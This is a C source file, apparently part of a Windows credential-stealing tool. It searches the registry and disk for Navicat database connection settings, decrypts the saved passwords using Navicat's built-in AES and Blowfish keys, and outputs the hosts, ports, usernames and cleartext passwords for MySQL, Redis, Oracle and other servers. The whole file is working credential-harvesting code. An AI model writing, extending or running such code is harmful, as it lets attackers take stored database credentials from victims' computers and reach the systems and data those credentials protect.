/* Navicat credential extraction — registry + disk search */
#include "navicat.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include "tinycrypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <windows.h>
#include <winreg.h>
#include <shlobj.h>

static char* decrypt_navicat12(const char* hex_pass){
    if(!hex_pass||!*hex_pass)return _strdup("(none)");
    int hl=(int)strlen(hex_pass);
    uint8_t*enc=malloc(hl/2+2);int el=hex_decode(hex_pass,enc,hl/2+1);
    /* If hex decode fails, try base64 (some Navicat versions use base64) */
    if(el<=0){el=tc_base64_decode(hex_pass,enc,hl);}
    if(el<=0){free(enc);return NULL;}
    int pl=((el+15)/16)*16;if(pl>el){enc=realloc(enc,pl);memset(enc+el,0,pl-el);}
    uint8_t key[16]="libcckeylibcckey",iv[16]="libcciv libcciv ";
    uint8_t*dec=malloc(pl);int dl;
    /* Navicat zero-pads (no PKCS7): raw decrypt + caller trims zeros */
    if(tc_aes128_cbc_decrypt_raw(key,iv,enc,pl,dec,&dl)!=0){free(enc);free(dec);return NULL;}
    free(enc);while(dl>0&&dec[dl-1]==0)dl--;
    char*r=malloc(dl+1);memcpy(r,dec,dl);r[dl]=0;free(dec);return r;
}

static char* decrypt_navicat11(const char* hex_pass){
    if(!hex_pass||!*hex_pass)return _strdup("(none)");
    int hl=(int)strlen(hex_pass);
    uint8_t*enc=malloc(hl/2+2);int el=hex_decode(hex_pass,enc,hl/2+1);
    if(el<=0){el=tc_base64_decode(hex_pass,enc,hl);}
    if(el<=0){free(enc);return _strdup("(Blowfish N/A)");}
    uint8_t bf_key[20];sha1_hash((uint8_t*)"3DC5CA39",8,bf_key);
    uint8_t bf_iv[8];hex_decode("d9c7c3c8870d64bd",bf_iv,8);
    uint8_t*dec=malloc(el+16);int dl;
    if(blowfish_cbc_decrypt_custom(bf_key,20,bf_iv,enc,el,dec,&dl)!=0){free(enc);free(dec);return _strdup("(Blowfish N/A)");}
    free(enc);while(dl>0&&dec[dl-1]==0)dl--;
    char*r=malloc(dl+1);memcpy(r,dec,dl);r[dl]=0;free(dec);return r;
}

static int is_printable_password(const char* s){
    if(!s||!*s)return 0;
    int len=(int)strlen(s), printable=0;
    if(len>512)return 0;
    for(int i=0;i<len;i++){
        unsigned char c=(unsigned char)s[i];
        if(c>=0x20&&c<0x7f)printable++;
        else if(c=='\t')printable++;
        else return 0;
    }
    return printable==len;
}

static int password_score(const char* s){
    if(!is_printable_password(s))return -1;
    if(strcmp(s,"(none)")==0||strcmp(s,"(Blowfish N/A)")==0||strcmp(s,"?")==0)return -1;
    int len=(int)strlen(s), score=0;
    if(len>=4&&len<=128)score+=20;
    if(len>128)score-=20;
    for(int i=0;i<len;i++){
        unsigned char c=(unsigned char)s[i];
        if(isalnum(c))score+=2;
        else if(strchr("!@#$%^&*()_+-=[]{};':,.<>/?\\|`~",c))score+=1;
        else score-=5;
    }
    return score;
}

static char* decrypt_pw(const char* enc,int v){
    if(!enc||!*enc)return _strdup("(none)");
    if(v==11)return decrypt_navicat11(enc);
    if(v>=12)return decrypt_navicat12(enc);
    return _strdup("(?)");
}

static int str_contains_ci(const char* haystack, const char* needle){
    if(!haystack||!needle||!*needle)return 0;
    size_t nl=strlen(needle);
    for(const char*p=haystack;*p;p++){
        size_t i=0;
        while(i<nl&&p[i]&&tolower((unsigned char)p[i])==tolower((unsigned char)needle[i]))i++;
        if(i==nl)return 1;
    }
    return 0;
}

static const char* infer_navicat_type(const char* raw_type, const char* reg_path, const char* port){
    if(raw_type&&*raw_type){
        if(_stricmp(raw_type,"ctStandalone")==0)return "Redis";
        if(_stricmp(raw_type,"MYSQL")==0||_stricmp(raw_type,"MARIADB")==0)return "MySQL";
        if(_stricmp(raw_type,"SQLSERVER")==0)return "SQLServer";
        if(_stricmp(raw_type,"POSTGRESQL")==0)return "PostgreSQL";
        if(_stricmp(raw_type,"MONGODB")==0)return "MongoDB";
        if(_stricmp(raw_type,"ORACLE")==0)return "Oracle";
        if(_stricmp(raw_type,"SQLITE")==0)return "SQLite";
        return raw_type;
    }
    if(reg_path&&*reg_path){
        if(str_contains_ci(reg_path,"redis")||str_contains_ci(reg_path,"ctstandalone"))return "Redis";
        if(str_contains_ci(reg_path,"mongodb"))return "MongoDB";
        if(str_contains_ci(reg_path,"postgres"))return "PostgreSQL";
        if(str_contains_ci(reg_path,"oracle"))return "Oracle";
        if(str_contains_ci(reg_path,"sqlserver")||str_contains_ci(reg_path,"mssql"))return "SQLServer";
        if(str_contains_ci(reg_path,"mariadb"))return "MySQL";
        if(str_contains_ci(reg_path,"mysql"))return "MySQL";
        if(str_contains_ci(reg_path,"sqlite"))return "SQLite";
    }
    if(port&&*port){
        if(strcmp(port,"6379")==0||strcmp(port,"26379")==0||strcmp(port,"22130")==0||strcmp(port,"6791")==0)return "Redis";
        if(strcmp(port,"27017")==0)return "MongoDB";
        if(strcmp(port,"1433")==0)return "SQLServer";
        if(strcmp(port,"1521")==0)return "Oracle";
        if(strcmp(port,"5432")==0)return "PostgreSQL";
        if(strcmp(port,"3306")==0||strcmp(port,"6034")==0||strcmp(port,"6000")==0||
           strcmp(port,"6091")==0||strcmp(port,"6004")==0||strcmp(port,"8307")==0||
           strcmp(port,"3239")==0||strcmp(port,"13406")==0||strcmp(port,"23306")==0)return "MySQL";
    }
    return "DB";
}

/* Read all string values from a registry key and extract connection info */
static char g_seen[256][256];static int g_seen_cnt=0;
static bool already_seen(const char* type,const char* host,const char* port,const char* db,const char* user){
    char key[256];
    snprintf(key,sizeof(key),"%s|%s|%s|%s|%s",
        type&&*type?type:"DB",host&&*host?host:"?",port&&*port?port:"?",db&&*db?db:"",user&&*user?user:"?");
    for(int i=0;i<g_seen_cnt&&i<256;i++)if(strcmp(g_seen[i],key)==0)return true;
    if(g_seen_cnt<256){strncpy(g_seen[g_seen_cnt],key,255);g_seen[g_seen_cnt][255]=0;g_seen_cnt++;}
    return false;
}

static char g_seen_install[32][MAX_PATH];static int g_seen_install_cnt=0;
static bool already_seen_install(const char* path){
    if(!path||!*path)return true;
    for(int i=0;i<g_seen_install_cnt&&i<32;i++)if(_stricmp(g_seen_install[i],path)==0)return true;
    if(g_seen_install_cnt<32){
        strncpy(g_seen_install[g_seen_install_cnt],path,MAX_PATH-1);
        g_seen_install[g_seen_install_cnt][MAX_PATH-1]=0;
        g_seen_install_cnt++;
    }
    return false;
}

static void read_server_key(HKEY hSrv, const char* srv_name, const char* reg_path, char* result, int* rp, int maxr, bool dump_fields){
    char host[256]="",port[32]="",user[256]="",pw[512]="",db[256]="",tp[64]="";
    char unknown_fields[1024]="";int ufp=0;
    DWORD vi=0;char vn[256];BYTE vd[4096];DWORD vs,vt;DWORD nsz;
    while(1){
        nsz=sizeof(vn);vs=sizeof(vd);
        LONG lr=RegEnumValueA(hSrv,vi++,vn,&nsz,NULL,&vt,vd,&vs);
        if(lr!=ERROR_SUCCESS)break;
        if(vt==REG_SZ&&vs>0&&vs<sizeof(vd)){
            char*val=(char*)vd;
            if(_stricmp(vn,"Host")==0)strncpy(host,val,255);
            else if(_stricmp(vn,"Port")==0)strncpy(port,val,31);
            else if(_stricmp(vn,"UserName")==0||_stricmp(vn,"User")==0)strncpy(user,val,255);
            else if(_stricmp(vn,"Pwd")==0||_stricmp(vn,"Password")==0)strncpy(pw,val,511);
            else if(_stricmp(vn,"Database")==0||_stricmp(vn,"DatabaseName")==0||_stricmp(vn,"DB")==0||_stricmp(vn,"InitialDatabase")==0||_stricmp(vn,"DefaultDatabase")==0||_stricmp(vn,"Db")==0||_stricmp(vn,"DataBase")==0||_stricmp(vn,"ServiceName")==0||_stricmp(vn,"SID")==0||_stricmp(vn,"Schema")==0||_stricmp(vn,"database")==0)strncpy(db,val,255);
            else if(_stricmp(vn,"ConnType")==0||_stricmp(vn,"Type")==0||_stricmp(vn,"ServerType")==0||_stricmp(vn,"DatabaseType")==0||_stricmp(vn,"DatabaseTypeName")==0)strncpy(tp,val,63);
            else if(dump_fields&&ufp+100<1024)ufp+=snprintf(unknown_fields+ufp,1024-ufp,"%s='%s' ",vn,val);
        } else if(vt==REG_DWORD&&vs==sizeof(DWORD)){
            DWORD dval=*(DWORD*)vd;
            if(_stricmp(vn,"Port")==0)snprintf(port,sizeof(port),"%u",dval);
            else if(dump_fields&&ufp+50<1024)ufp+=snprintf(unknown_fields+ufp,1024-ufp,"%s=%u ",vn,dval);
        }
    }
    if(!port[0])strcpy(port,"3306");
    const char* display_type=infer_navicat_type(tp,reg_path,port);
    if(already_seen(display_type,host,port,db,user))return;
    if(pw[0]){
        char *d11=decrypt_navicat11(pw),*d12=decrypt_navicat12(pw);
        const char* pass;
        int s12 = password_score(d12);
        int s11 = password_score(d11);
        if (s12 >= s11 && s12 >= 0) pass = d12;
        else if (s11 >= 0) pass = d11;
        else {
            /* Both decryptions produced non-printable/binary output or failed. */
            static char raw_info[128];
            int pw_len = (int)strlen(pw);
            snprintf(raw_info, sizeof(raw_info), "?(decrypt-failed raw-len:%d)", pw_len);
            pass = raw_info;
        }
        *rp+=snprintf(result+*rp,maxr-*rp,"[Reg] %s | %s %s:%s/%s user=%s pass=%s%s%s\n",
            srv_name,display_type,host[0]?host:"?",port,db[0]?db:"(unknown)",user[0]?user:"?",pass,
            dump_fields&&unknown_fields[0]?" [fields: ":"",dump_fields&&unknown_fields[0]?unknown_fields:"",dump_fields&&unknown_fields[0]?"]":"");
        free(d11);free(d12);
    }
}

/* Recursively search a registry path for Servers keys */
static void search_reg_path(const char* base_path, char* result, int* rp, int maxr, int depth){
    if(depth>4)return;
    HKEY hk;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,base_path,0,KEY_READ|KEY_ENUMERATE_SUB_KEYS,&hk)!=ERROR_SUCCESS)return;

    /* Check if this key has a Servers subkey */
    HKEY hs;
    if(RegOpenKeyExA(hk,"Servers",0,KEY_READ|KEY_ENUMERATE_SUB_KEYS,&hs)==ERROR_SUCCESS){
        DWORD si=0;char sn[256];
        while(RegEnumKeyA(hs,si++,sn,sizeof(sn))==ERROR_SUCCESS){
            HKEY hsv;
            char fp[1024];snprintf(fp,sizeof(fp),"%s\\Servers\\%s",base_path,sn);
            if(RegOpenKeyExA(HKEY_CURRENT_USER,fp,0,KEY_READ,&hsv)==ERROR_SUCCESS){
                read_server_key(hsv,sn,fp,result,rp,maxr,false);
                RegCloseKey(hsv);
            }
        }
        RegCloseKey(hs);
    }

    /* Enumerate subkeys recursively */
    DWORD idx=0;char sub[256];
    while(RegEnumKeyA(hk,idx++,sub,sizeof(sub))==ERROR_SUCCESS){
        if(strcmp(sub,"Servers")==0)continue;
        char next[1024];snprintf(next,sizeof(next),"%s\\%s",base_path,sub);
        search_reg_path(next,result,rp,maxr,depth+1);
    }
    RegCloseKey(hk);
}

/* Search disk for Navicat config/registry export files */
static void search_disk(char* result, int* rp, int maxr){
    char up[MAX_PATH];GetEnvironmentVariableA("USERPROFILE",up,sizeof(up));
    /* Search for .ncx files */
    const char* dirs[]={up,NULL};
    const char* sub[]={"\\Desktop","\\Documents","\\Downloads","",NULL};
    for(int d=0;dirs[d];d++){
        for(int s=0;sub[s];s++){
            char base[MAX_PATH];snprintf(base,sizeof(base),"%s%s",dirs[d],sub[s]);
            char srch[MAX_PATH];snprintf(srch,sizeof(srch),"%s\\*",base);
            WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA(srch,&fd);
            if(hf==INVALID_HANDLE_VALUE)continue;
            do{
                if(fd.cFileName[0]=='.')continue;
                char*ext=strrchr(fd.cFileName,'.');
                if(ext&&_stricmp(ext,".ncx")==0){
                    char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\%s",base,fd.cFileName);
                    *rp+=snprintf(result+*rp,maxr-*rp,"[NCX] Found: %s\n  Use: -navicat-ncx \"%s\"\n",fp,fp);
                }
                if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
                    /* Search for Navicat installation dirs */
                    if(strstr(fd.cFileName,"Navicat")||strstr(fd.cFileName,"PremiumSoft")){
                        char fp2[MAX_PATH];snprintf(fp2,sizeof(fp2),"%s\\%s",base,fd.cFileName);char*ncx=find_file_recursive(fp2,"*.ncx",5);
                        if(ncx){*rp+=snprintf(result+*rp,maxr-*rp,"[NCX] Found: %s\n",ncx);free(ncx);}
                    }
                }
            }while(FindNextFileA(hf,&fd));
            FindClose(hf);
        }
    }
    /* Search Program Files for Navicat — direct check first (standard install
     * layout is one level deep), deep recursion only as fallback. */
    const char*pf[]={getenv("ProgramFiles"),getenv("ProgramFiles(x86)"),"C:\\Program Files","C:\\Program Files (x86)",NULL};
    for(int i=0;pf[i];i++){
        if(i==2&&pf[0]&&_stricmp(pf[0],"C:\\Program Files")==0)continue; /* dup of pf[0] */
        if(i==3&&pf[1]&&_stricmp(pf[1],"C:\\Program Files (x86)")==0)continue; /* dup of pf[1] */
        /* fast: standard layout <PF>\PremiumSoft\Navicat* (no recursion) */
        char psdir[MAX_PATH];snprintf(psdir,sizeof(psdir),"%s\\PremiumSoft",pf[i]);
        WIN32_FIND_DATAA fd2;char srch2[MAX_PATH];snprintf(srch2,sizeof(srch2),"%s\\Navicat*",psdir);
        HANDLE hf2=FindFirstFileA(srch2,&fd2);
        if(hf2!=INVALID_HANDLE_VALUE){
            do{
                if(fd2.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
                    char dir[MAX_PATH];snprintf(dir,sizeof(dir),"%s\\%s",psdir,fd2.cFileName);
                    if(!already_seen_install(dir))
                        *rp+=snprintf(result+*rp,maxr-*rp,"[Install] Found: %s\n",dir);
                }
            }while(FindNextFileA(hf2,&fd2));
            FindClose(hf2);
            continue; /* standard layout found — skip deep recursion for this root */
        }
        /* fallback: non-standard layout — deep recursive search (depth 3 is
         * enough for Navicat; depth 5 walks huge trees for nothing) */
        char*dir=find_dir_recursive(pf[i],"Navicat*",3);
        if(!dir)dir=find_dir_recursive(pf[i],"PremiumSoft",3);
        if(dir){
            if(!already_seen_install(dir))
                *rp+=snprintf(result+*rp,maxr-*rp,"[Install] Found: %s\n",dir);
            free(dir);
            break; /* found an install under this root — stop scanning others */
        }
    }
}

const char* navicat_scan(const char* ncx_file, bool from_reg, int version){
    static char result[65536];int rp=0;result[0]=0;
    g_seen_cnt=0;
    memset(g_seen,0,sizeof(g_seen));
    g_seen_install_cnt=0;
    memset(g_seen_install,0,sizeof(g_seen_install));

    /* Parse explicit NCX file */
    if(ncx_file&&ncx_file[0]){
        FILE*f=fopen(ncx_file,"rb");if(f){
            fseek(f,0,SEEK_END);long sz=ftell(f);fseek(f,0,SEEK_SET);
            if(sz>0&&sz<10485760){char*xml=malloc(sz+1);if(xml&&fread(xml,1,sz,f)==(size_t)sz){xml[sz]=0;
                const char*p=xml;
                while((p=strstr(p,"<Connection "))!=NULL){
                    const char*end=strstr(p,"/>");if(!end){end=strstr(p,"</Connection>");if(!end)break;}
                    char blk[4096];int bl=(int)(end-p);if(bl>4095)bl=4095;memcpy(blk,p,bl);blk[bl]=0;
                    char tp[64]="",host[256]="",port[16]="",db[256]="",user[256]="",pw[512]="";
                    #define XA(buf,attr) do{char pat[128];snprintf(pat,sizeof(pat),"%s=\"",attr);const char*s=strstr(blk,pat);if(s){s+=strlen(pat);const char*e=strchr(s,'"');if(e){int l=(int)(e-s);if(l<(int)sizeof(buf)){memcpy(buf,s,l);buf[l]=0;}}}}while(0)
                    XA(tp,"ConnType");XA(host,"Host");XA(port,"Port");XA(db,"Database");XA(user,"UserName");XA(pw,"Password");
                    if(pw[0]){char*dp=decrypt_pw(pw,version);rp+=snprintf(result+rp,sizeof(result)-rp,"[NCX] %s:%s db=%s user=%s pass=%s\n",tp,host,db,user,(dp&&is_printable_password(dp))?dp:"?(decrypt-failed)");free(dp);}
                    p=end+1;
                }}
            free(xml);}fclose(f);
        }
    }

    /* Search registry recursively */
    if(from_reg){
        const char* reg_roots[]={
            "Software\\PremiumSoft",
            "Software\\PremiumSoft\\Navicat",
            "Software\\PremiumSoft\\Navicat Premium",
            "Software\\Classes",
            NULL
        };
        for(int i=0;reg_roots[i];i++)
            search_reg_path(reg_roots[i],result,&rp,sizeof(result),0);
    }

    /* Also search disk */
    search_disk(result,&rp,sizeof(result));

    if(!result[0])snprintf(result,sizeof(result),
        "Navicat not found. Searched: registry (HKCU recursively), Desktop/Documents for .ncx files, Program Files.\n"
        "If Navicat is installed, try exporting connections as .ncx and use: -navicat-ncx file.ncx\n");
    return result;
}
